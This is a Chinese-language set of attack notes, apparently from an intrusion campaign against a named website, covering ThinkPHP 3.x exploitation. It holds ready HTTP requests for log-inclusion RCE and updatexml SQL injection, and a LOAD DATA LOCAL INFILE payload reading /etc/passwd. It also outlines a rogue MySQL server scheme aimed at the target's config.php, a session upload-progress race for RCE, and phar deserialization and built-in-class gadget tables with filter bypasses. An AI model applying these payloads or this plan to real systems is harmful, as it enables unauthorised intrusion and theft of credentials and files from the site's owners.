# ThinkPHP 3.x 新增 CVE + TP3.2.4 count SQLi + LOAD DATA LOCAL

> 来源：jiangxisls 全案 PHP 攻击路径图谱（2026-09-15）
> 适用：ThinkPHP 3.x 全系列 + MySQL 5.5（allow_local_infile=On）

## TP3 新增 CVE（9-14 矩阵未覆盖）

| CVE | 版本 | 类型 | 利用点 | 备注 |
|-----|------|------|--------|------|
| **CVE-2021-44892** | 3.x ≤3.2.3 | RCE | `index.php` 的 `value[_filename]` | 文件包含式 RCE |
| **CVE-2025-50707** | 3.2.5 | RCE | `index.php` 组件 | 2025-08 新 CVE |
| **CVE-2018-10225** | 3.1.3 | SQLi | `index.php?s=` 参数 | URL 路由注入 |
| **TP 3.2.4 SQLi** | 3.2.4 | SQLi | `count` 参数 / `parseKey` 处理 key 缺陷 | 框架层注入 |

### CVE-2021-44892 利用

```http
POST /index.php?s=Home/View/assign
Content-Type: application/x-www-form-urlencoded

value[_filename]=./Application/Runtime/Logs/Home/26_09_15.log
# 先通过访问错误路由让 TP3 把 payload 写入日志
# 然后用 _filename 参数让模板引擎包含日志文件 → RCE
```

### TP 3.2.4 count SQLi

```http
# parseKey 对 key 缺乏严格过滤
GET /index.php?s=/Home/Index/index&count=1)%20and%20updatexml(1,concat(0x7e,user()),1)--+
# 或通过 M()->where(array)->count() 触发
```

## LOAD DATA LOCAL INFILE（MySQL 5.5 默认 ON）

**条件确认**（phpinfo 已验证）：
- `mysql.allow_local_infile = On`
- `mysqli.allow_local_infile = On`  
- MySQL 5.5.42（服务端 `local_infile` 默认 ON）

**两种利用方式**：

### 方式 A：通过 SQLi 注入 LOAD DATA 语句

```sql
-- 如果 SQLi 允许堆叠查询 + LOAD DATA 权限
';LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE temp_table FIELDS TERMINATED BY '\n'--
```

### 方式 B：恶意 MySQL 服务器读客户端文件

```python
# 使用 Rogue-MySQL-Server / MySQL-Fake-Server
# 原理：MySQL 协议允许服务端主动向客户端索取文件
# 如果能让目标 PHP 连接我们控制的 MySQL → 读取 web 服务器任意文件

# 目标连接字符串: mysql_connect("恶意IP", "user", "pass")
# 恶意 MySQL 发送 LOAD DATA LOCAL INFILE '/wwwroot/jxck.mingyaohui.com/inc/config.php'
# → PHP 客户端自动回传文件内容
```

**关键前提**：需要控制应用的数据库连接地址（通过 SQLi 或配置注入）

## session.upload_progress 结论修正

**旧结论（9-14）**：`cleanup=On` → 会话注入失效
**修正后**：`cleanup=On` **不等于失效**，而是**需要条件竞争**

```
session.upload_progress.enabled = On（前提1 ✅）
session.upload_progress.cleanup = On（需竞争）
session.upload_progress.prefix = "upload_progress_"
session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"

# 竞争窗口：
# PHP 处理上传 → 写 session 文件 → 处理完毕 → cleanup 删除
# 在 cleanup 之前包含 session 文件 → RCE

# 但 nginx fastcgi_request_buffering=On（默认）→ 请求体整体缓冲
# → PHP 侧看不到"缓慢上传"，窗口极小
# 解法：大量并发上传 + 同时包含
```

## phar 反序列化触发点全表（不需 unserialize 入口）

以下文件操作函数遇到 `phar://` 协议均触发反序列化：
```
file_exists / filesize / is_dir / is_file / is_readable
getimagesize / exif_read_data / filemtime / stat / md5_file
copy / unlink / fopen / file_get_contents / file
```

**绕过**：改后缀为 `.jpg`/`.gif` 仍触发；`phar://./x.phar` 绕过路径过滤

## PHP 内置类利用表（反序列化无 POP 链时）

| 类 | 能力 | PHP 5.6 可用 |
|----|------|-------------|
| SoapClient | SSRF + CRLF 注入任意 HTTP 请求 | ✅（需 soap 扩展） |
| Exception | XSS（`__toString` 可控输出） | ✅ |
| SplFileObject | 读文件（绕函数黑名单） | ✅ |
| SimpleXMLElement | XXE（旧 libxml） | ✅ |
| DirectoryIterator | 遍历目录（配 `glob://`） | ✅ |
| GlobIterator | 批量遍历 | ✅ |
